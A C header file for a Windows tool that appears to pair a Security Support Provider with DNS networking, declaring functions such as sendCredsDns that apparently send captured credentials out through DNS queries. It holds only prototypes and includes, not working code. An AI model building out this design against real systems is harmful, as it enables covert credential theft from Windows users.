#ifndef _DNS_H
#define _DNS_H

#include <stdio.h>
#include <windows.h>
#include <windns.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include "utils.h"
#include "ssp.h"

#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "ws2_32.lib")

BOOL dnsRequest(WCHAR*);
BOOL craftRequestAndSend(char*, char*);
void sendCredsDns(WCHAR*, WCHAR*, WCHAR*);

#endif